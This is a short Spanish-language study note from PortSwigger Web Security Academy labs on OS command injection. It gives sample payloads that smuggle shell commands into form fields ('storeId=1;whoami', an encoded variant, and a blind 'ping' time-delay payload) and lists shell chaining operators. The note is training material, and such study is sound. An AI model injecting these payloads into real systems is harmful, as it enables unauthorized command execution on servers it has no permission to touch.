# Payloads - OS Command Injection

## Laboratorio 1 — Command Injection visible

### Ejecutar `whoami`

```http
storeId=1;whoami
```

El punto y coma termina el valor o comando anterior y ejecuta `whoami`.

### Versión con URL encoding

```http
storeId=1%3Bwhoami
```

En URL encoding:

```text
%3B = ;
```

El servidor decodifica el parámetro antes de procesarlo.

### Comandos de prueba

```bash
whoami
```

Muestra el usuario que ejecuta el proceso.

```bash
id
```

Muestra UID, GID y grupos del usuario.

---

## Laboratorio 2 — Blind Command Injection

### Retraso controlado

```http
email=x||ping+-c+10+127.0.0.1||
```

Después de decodificarse, el comando contiene:

```bash
ping -c 10 127.0.0.1
```

### Explicación

* `||` permite separar o encadenar el comando inyectado.
* `ping` envía paquetes ICMP.
* `-c 10` limita la ejecución a diez paquetes.
* `127.0.0.1` es la dirección loopback del servidor.
* Los signos `+` representan espacios en datos enviados como `application/x-www-form-urlencoded`.

El comando genera un retraso aproximado de diez segundos, lo que permite confirmar la ejecución aunque la salida no aparezca.

---

## Operadores útiles

```bash
;
```

Ejecuta el siguiente comando sin importar el resultado anterior.

```bash
&&
```

Ejecuta el siguiente comando si el anterior funcionó.

```bash
||
```

Ejecuta el siguiente comando si el anterior falló.

```bash
|
```

Envía la salida de un comando al siguiente.

```bash
$()
```

Ejecuta un comando e inserta su resultado.

## Nota

Estos payloads fueron utilizados exclusivamente en laboratorios autorizados de PortSwigger Web Security Academy.
